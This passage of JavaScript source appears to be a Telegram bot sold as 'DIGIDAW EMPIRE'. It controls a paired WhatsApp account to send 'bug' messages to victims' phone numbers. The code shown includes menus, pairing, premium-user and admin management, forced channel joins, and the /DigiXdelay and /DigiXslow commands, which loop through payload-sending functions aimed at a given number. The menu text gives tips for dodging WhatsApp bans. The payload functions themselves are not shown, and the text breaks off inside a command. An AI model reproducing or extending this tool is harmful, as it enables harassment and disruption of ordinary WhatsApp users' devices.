© 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤
`;

    const keyboard = [
  [
    { text: "ʙᴜɢ ᴘᴇɴᴊᴇʟᴀsᴀɴ", callback_data: "/penjelasan", style: "success", icon_custom_emoji_id: "5877485980901971030" }
  ],
  [
    { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5877629862306385808" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
    }
});

bot.action('/penjelasan', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const bugMenu = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.0 New Version Script
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>｟ 𝐏𝐄𝐍𝐉𝐄𝐋𝐀𝐒𝐀𝐍 𝐌𝐄𝐍𝐔 ｠
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Old Jamin Aman 100%
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Fresh Wajib Save 85%
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Old Bebas Spam All Command Bugs
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Fresh Jeda Command Minimal 30-45 Detik
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Jika Tidak Bisa Melakukan Pairing Berarti Sender Kalian Mengalami Ban Pairing
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Jika Bugs Tidak Work Kemungkinan Sender Kalian Mengalami Soft Banned</blockquote>
© 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5877629862306385808" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
    }
});

bot.action('/tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const tqtoMenu = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 30.0 New Version Script
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote> ༺ Tq To Digidaw ༻ </blockquote>
<blockquote><tg-emoji emoji-id="5803032306213982905">👑</tg-emoji> SUPPORT SCRIPT
━━━━━━━━━━━━━━━━━━━━━━━━
⤷ @Xatanicvxii
⤷ @RyuuuTzyy
⤷ @Bawzzhhh
⤷ @KoaxTzy_Md
⤷ @urmomdies
⤷ @mklum4t11
⤷ @Nevaaluv
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Silahkan Tekan Button Dibawah Untuk Melanjutkan</b></blockquote>
© 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5877629862306385808" }
  ]
];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
    }
});

//========== FUNGSI EKSTRAK KODE INVITE DARI LINK ==========
function assertSocketReady() {
    if (!sock || !sock.user) {
        throw new Error('Koneksi WhatsApp belum siap atau terputus.');
    }
}

function extractInviteCode(input) {
    if (!input || typeof input !== "string") return null;

    const value = input.trim();

    const match = value.match(
        /(?:https?:\/\/)?chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/
    );

    return match ? match[1] : null;
}

function normalizePhoneJid(jid) {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
}

function isSameWaUser(jid1, jid2) {
    return normalizePhoneJid(jid1) === normalizePhoneJid(jid2);
}

function isGroupMember(metadata, myJid) {
    return metadata.participants?.some((p) => isSameWaUser(p.id, myJid));
}

function isReachoutRestrictedError(err) {
    if (!err) return false;
    const msg = err.message || '';
    return msg.includes('account_reachout_restricted') || msg.includes('428') || msg.includes('reachout');
}

async function findJoinedGroupByInvite(sock, inviteCode) {
    try {
        const groups = await sock.groupFetchAllParticipating();
        for (const group of Object.values(groups)) {
            try {
                const code = await sock.groupInviteCode(group.id);
                if (code === inviteCode) {
                    console.log(chalk.cyan(`ℹ️ Grup ditemukan via invite (sudah join): ${group.id}`));
                    return group.id;
                }
            } catch (_) {}
        }
    } catch (_) {}
    return null;
}

async function joinGroupByInvite(sock, inviteCode) {
    assertSocketReady();

    const existingJid = await findJoinedGroupByInvite(sock, inviteCode);
    if (existingJid) return existingJid;

    let inviteInfo = null;
    try {
        inviteInfo = await sock.groupGetInviteInfo(inviteCode);
    } catch (err) {
        if (err.message?.includes('account_reachout_restricted')) {
            const fromCache = await findJoinedGroupByInvite(sock, inviteCode);
            if (fromCache) return fromCache;
            throw new Error('account_reachout_restricted');
        }
    }

    if (inviteInfo?.id) {
        try {
            const metadata = await sock.groupMetadata(inviteInfo.id);
            if (isGroupMember(metadata, sock.user?.id)) {
                console.log(chalk.cyan(`ℹ️ Bot sudah ada di grup: ${inviteInfo.id}`));
                return inviteInfo.id;
            }
        } catch (_) {}
    }

    const maxRetry = 3;
    for (let attempt = 1; attempt <= maxRetry; attempt++) {
        try {
            if (attempt > 1) await sleep(3000);
            const groupJid = await sock.groupAcceptInvite(inviteCode);
            if (groupJid) return groupJid;
        } catch (err) {
            if (err.message?.includes('account_reachout_restricted')) {
                throw err;
            }
            if (attempt === maxRetry) throw err;
            console.log(chalk.yellow(`⚠️ Join gagal (attempt ${attempt}/${maxRetry}): ${err.message}`));
        }
    }

    throw new Error('Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.');
}

async function resolveGroupJid(sock, input) {
    const parsed = parseGroupInput(input);
    if (parsed.type === 'invalid') {
        throw new Error('Format tidak valid. Pakai link undangan atau JID grup (xxxxx@g.us)');
    }

    if (parsed.type === 'jid') {
        assertSocketReady();
        try {
            const metadata = await sock.groupMetadata(parsed.value);
            if (!isGroupMember(metadata, sock.user?.id)) {
                throw new Error('Bot belum ada di grup ini. Join manual dari HP, lalu /listgroup');
            }
        } catch (err) {
            if (err.message?.includes('belum ada di grup')) throw err;
            throw new Error(`Tidak bisa akses grup ${parsed.value}. Pastikan bot sudah join dari HP.`);
        }
        console.log(chalk.cyan(`ℹ️ Pakai grup langsung: ${parsed.value}`));
        return parsed.value;
    }

    return joinGroupByInvite(sock, parsed.value);
}

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "DIGI1234")
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

const pairingMenu = `
<blockquote>
╭━〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤〕━╮

「 CONNECTION NOMOR 」

◈ Status : Not Connected
◈ Number : ${phoneNumber}
◈ Code   : ${formattedCode}

 ───────────────────

© 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤
</blockquote>
`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command("ceksender", async (ctx) => {
    const uptime = process.uptime();
    const getUptime = () => {
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        return `${days}d ${hours}h ${minutes}m ${seconds}s`;
    };

    if (sock && sock.user && isWhatsAppConnected) {
        try {
            await sock.sendMessage(sock.user.id, { text: ".", delete: true });
            await ctx.reply(
                `╭──〔 STATUS WHATSAPP 〕
│
│ Status : ✅ TERHUBUNG
│ Uptime : ${getUptime()}
│
╰────────────────────────

✅ Bot siap digunakan. Silakan kirim bug.`,
                { parse_mode: 'HTML' }
            );
            return;
        } catch (err) {
            if (err.message && err.message.includes('closed')) {
                await ctx.reply(
                    `╭──〔 📡 STATUS WHATSAPP 〕
│
│ Status : ❌ CONNECTION CLOSED
│ Uptime : ${getUptime()}
│
╰────────────────────────

CONNECTION CLOSED DETECTED!

CARA FIX:
1. Ketik cmd /resetsession
2. Tunggu 10 detik
3. Ketik /requestpair

🔄 Kalo masih Connection Closed, ulangi step 1-4.`,
                    { parse_mode: 'HTML' }
                );
            } else {
                await ctx.reply(
                    `╭──〔 📡 STATUS WHATSAPP 〕
│
│ Status : ❌ ERROR
│ Uptime : ${getUptime()}
│
╰────────────────────────

Error: ${err.message ? err.message.slice(0, 50) : 'Unknown error'}

➡️ /resetsession, lalu /ceksender lagi.`,
                    { parse_mode: 'HTML' }
                );
            }
            return;
        }
    }

    await ctx.reply(
        `╭──〔 STATUS WHATSAPP 〕
│
│ Status : ❌ TIDAK TERHUBUNG
│ Uptime : ${getUptime()}
│
╰────────────────────────

WhatsApp belum terhubung!

CARA:
1. Ketik /requestpair 628xxxxxxxx
2. Masukin kode pairing ke WhatsApp
3. Ketik /ceksender lagi`,
        { parse_mode: 'HTML' }
    );
});
bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsessions", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ================= PREMIUM GRUP PERMANEN =================

function isPremiumGroup(chatId) {
    if (!chatId) return false;

    const premiumUsers = loadPremiumUsers();

    return premiumUsers.__groups?.[String(chatId)] === true;
}

function addPremiumGroup(chatId) {
    const premiumUsers = loadPremiumUsers();

    if (!premiumUsers.__groups) {
        premiumUsers.__groups = {};
    }

    premiumUsers.__groups[String(chatId)] = true;

    savePremiumUsers(premiumUsers);
}

function removePremiumGroup(chatId) {
    const premiumUsers = loadPremiumUsers();

    if (!premiumUsers.__groups) {
        premiumUsers.__groups = {};
    }

    delete premiumUsers.__groups[String(chatId)];

    if (Object.keys(premiumUsers.__groups).length === 0) {
        delete premiumUsers.__groups;
    }

    savePremiumUsers(premiumUsers);
}

// ================= COMMAND ADD PREMIUM GRUP =================

bot.command("addpremgrup", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Command ini khusus OWNER.");
    }

    if (!["group", "supergroup"].includes(ctx.chat.type)) {
        return ctx.reply("❌ Gunakan command ini di dalam grup.");
    }

    if (isPremiumGroup(ctx.chat.id)) {
        return ctx.reply("✅ Grup ini sudah memiliki premium permanen.");
    }

    addPremiumGroup(ctx.chat.id);

    return ctx.reply(
        "✅ PREMIUM GRUP BERHASIL DIAKTIFKAN\n\n" +
        `🆔 ID GRUP: ${ctx.chat.id}\n` +
        "⏳ DURASI: PERMANEN"
    );
});

// ================= COMMAND DELETE PREMIUM GRUP =================

bot.command("delpremgrup", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Command ini khusus OWNER.");
    }

    if (!["group", "supergroup"].includes(ctx.chat.type)) {
        return ctx.reply("❌ Gunakan command ini di dalam grup.");
    }

    if (!isPremiumGroup(ctx.chat.id)) {
        return ctx.reply("❌ Grup ini belum memiliki premium.");
    }

    removePremiumGroup(ctx.chat.id);

    return ctx.reply(
        "✅ PREMIUM GRUP BERHASIL DIHAPUS\n\n" +
        `🆔 ID GRUP: ${ctx.chat.id}\n` +
        "🗑 ID grup telah dihapus dari premium.json."
    );
});

// ================= BLOCK COMMAND SYSTEM =================

function loadBlockedCommands() {
    try {
        const data = JSON.parse(
            fs.readFileSync(blockcmdFile, "utf8")
        );

        if (Array.isArray(data)) return data;

        return Array.isArray(data.commands)
            ? data.commands
            : [];
    } catch {
        return [];
    }
}

function saveBlockedCommands(commands) {
    fs.mkdirSync(path.dirname(blockcmdFile), {
        recursive: true
    });

    fs.writeFileSync(
        blockcmdFile,
        JSON.stringify({
            commands: [...new Set(commands)]
        }, null, 2)
    );
}

function normalizeCommand(command) {
    return String(command || "")
        .trim()
        .replace(/^\//, "")
        .split("@")[0]
        .toLowerCase();
}

// Middleware harus didaftarkan sebelum handler command.
bot.use(async (ctx, next) => {
    const message = ctx.message?.text;

    if (!message || !message.startsWith("/")) {
        return next();
    }

    // OWNER selalu bisa menggunakan command.
    if (String(ctx.from?.id) === String(ownerID)) {
        return next();
    }

    const command = normalizeCommand(message.split(/\s+/)[0]);

    const blockedCommands = loadBlockedCommands();

    if (blockedCommands.includes(command)) {
        return ctx.reply(
            `⛔ Command /${command} sedang diblokir oleh owner.`
        );
    }

    return next();
});

// ================= /blockcmd =================

bot.command("blockcmd", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Khusus OWNER.");
    }

    const command = normalizeCommand(
        ctx.message.text.split(/\s+/)[1]
    );

    if (!command || !/^[a-z0-9_]{1,64}$/.test(command)) {
        return ctx.reply("Format: /blockcmd nama_command");
    }

    const commands = loadBlockedCommands();

    if (commands.includes(command)) {
        return ctx.reply(`⚠️ /${command} sudah diblokir.`);
    }

    commands.push(command);
    saveBlockedCommands(commands);

    return ctx.reply(`✅ Command /${command} berhasil diblokir.`);
});

// ================= /unblockcmd =================

bot.command("unblockcmd", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Khusus OWNER.");
    }

    const command = normalizeCommand(
        ctx.message.text.split(/\s+/)[1]
    );

    const commands = loadBlockedCommands();

    if (!command) {
        return ctx.reply(
            "📋 COMMAND TERBLOKIR:\n" +
            (commands.length
                ? commands.map(cmd => `• /${cmd}`).join("\n")
                : "Tidak ada command yang diblokir.")
        );
    }

    if (!commands.includes(command)) {
        return ctx.reply(`⚠️ /${command} tidak ada dalam daftar blokir.`);
    }

    saveBlockedCommands(
        commands.filter(cmd => cmd !== command)
    );

    return ctx.reply(`✅ Command /${command} berhasil dibuka blokirnya.`);
});

const checkCommandEnabled = async (ctx, next) => {
    if (!ctx.message?.text) return next();

    const text = ctx.message.text.trim();
    if (!text.startsWith("/")) return next();

    let cmd = text.split(/\s+/)[0].toLowerCase();

    if (cmd.includes("@")) {
        cmd = cmd.split("@")[0];
    }

    const managementCommands = [
        "/blockcmd",
        "/unblockcmd",
        "/listblockcmd",
        "/setcd"
    ];

    if (managementCommands.includes(cmd)) {
        return next();
    }

    // OWNER bebas menggunakan semua command
    if (String(ctx.from?.id) === String(ownerID)) {
        return next();
    }

    try {
        // Baca blockcmdFile
        const data = JSON.parse(
            fs.readFileSync(blockcmdFile, "utf8")
        );

        const blockedCommands = Array.isArray(data)
            ? data
            : Array.isArray(data.commands)
                ? data.commands
                : [];

        const normalizedBlocked = blockedCommands.map(command => {
            let value = String(command).trim().toLowerCase();

            if (!value.startsWith("/")) {
                value = "/" + value;
            }

            if (value.includes("@")) {
                value = value.split("@")[0];
            }

            return value;
        });

        if (normalizedBlocked.includes(cmd)) {
            return ctx.reply(
                `⛔ Command ${cmd} sedang diblokir oleh owner.`
            );
        }

    } catch (error) {
        console.error("[BLOCKCMD ERROR]", error);
    }

    return next();
};

// ================ REQUIRED CHANNEL SYSTEM ================

const requiredChannelFile = "./database/required_channels.json";

function loadRequiredChannels() {
    try {
        if (!fs.existsSync(requiredChannelFile)) return {};
        return JSON.parse(fs.readFileSync(requiredChannelFile, "utf8"));
    } catch (error) {
        console.error("[SETCH LOAD ERROR]", error);
        return {};
    }
}

function saveRequiredChannels(data) {
    fs.mkdirSync(path.dirname(requiredChannelFile), {
        recursive: true
    });

    fs.writeFileSync(
        requiredChannelFile,
        JSON.stringify(data, null, 2)
    );
}

// ================ /setch ================

bot.command("setch", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Khusus OWNER.");
    }

    const args = ctx.message.text.trim().split(/\s+/);
    const number = Number(args[1]);
    const channel = args[2];

    if (!Number.isInteger(number) || number < 1 || !channel?.startsWith("@")) {
        return ctx.reply("Format: /setch 1 @DigidawProject");
    }

    const channels = loadRequiredChannels();
    channels[String(number)] = channel;

    saveRequiredChannels(channels);

    return ctx.reply(
        `✅ CHANNEL BERHASIL DIATUR\n\nNomor: ${number}\nChannel: ${channel}`
    );
});

// ================ /delch ================

bot.command("delch", async (ctx) => {
    if (String(ctx.from.id) !== String(ownerID)) {
        return ctx.reply("❌ Khusus OWNER.");
    }

    const args = ctx.message.text.trim().split(/\s+/);
    const number = args[1];
    const channels = loadRequiredChannels();

    if (!number) {
        return ctx.reply("Format:\n/delch 1\n/delch all");
    }

    if (number.toLowerCase() === "all") {
        saveRequiredChannels({});
        return ctx.reply("✅ Semua channel wajib join berhasil dihapus.");
    }

    if (!channels[number]) {
        return ctx.reply(`❌ Channel nomor ${number} tidak ditemukan.`);
    }

    delete channels[number];
    saveRequiredChannels(channels);

    return ctx.reply(`✅ Channel nomor ${number} berhasil dihapus.`);
});

// ================ FORCE JOIN CHECK ================

const checkRequiredChannels = async (ctx, next) => {
    const text = ctx.message?.text || "";

    const managementCommands = ["/setch", "/delch"];

    const command = text.split(/\s+/)[0]
        .split("@")[0]
        .toLowerCase();

    if (managementCommands.includes(command)) {
        return next();
    }

    const channels = loadRequiredChannels();
    const entries = Object.entries(channels);

    if (!entries.length) {
        return next();
    }

    const notJoined = [];

    for (const [number, channel] of entries) {
        try {
            const member = await ctx.telegram.getChatMember(
                channel,
                ctx.from.id
            );

            const joined = [
                "creator",
                "administrator",
                "member"
            ].includes(member.status) ||
            (member.status === "restricted" && member.is_member);

            if (!joined) {
                notJoined.push({ number, channel });
            }
        } catch (error) {
            console.error(
                `[FORCE JOIN ERROR] ${channel}:`,
                error.message
            );

            notJoined.push({ number, channel });
        }
    }

    if (!notJoined.length) {
        return next();
    }

    const buttons = notJoined.map(item => [{
        text: `JOIN CHANNEL ${item.number}`,
        url: `https://t.me/${item.channel.replace("@", "")}`
    }]);

    buttons.push([{
        text: "🔄 CEK SUDAH JOIN",
        callback_data: "check_required_channels"
    }]);

    if (ctx.callbackQuery) {
        await ctx.answerCbQuery(
            "Silakan join channel wajib terlebih dahulu."
        ).catch(() => {});
    }

    return ctx.reply(
        "⛔ AKSES BOT DIBATASI\n\nSilakan bergabung ke semua channel berikut untuk menggunakan bot.",
        {
            reply_markup: {
                inline_keyboard: buttons
            }
        }
    );
};

bot.use(checkRequiredChannels);

bot.action("check_required_channels", async (ctx) => {
    await ctx.answerCbQuery("Silakan kirim /start kembali setelah join.");
    await ctx.reply("Kirim /start kembali untuk memeriksa keanggotaan channel.");
});



bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addpremium', checkAdmin, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

//=======CASE BUG ANDROID=======\\
bot.command(
  "DigiXdelay",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXdelay 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : 𝖣𝖤𝖫𝖠𝖸
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
        await jirrdelayinvis(sock, target);
        await ikyyidelayinvis(sock, target);
        await buldo(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command(
  "DigiXslow",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXslow 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : 𝖣𝖤𝖫𝖠𝖸
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
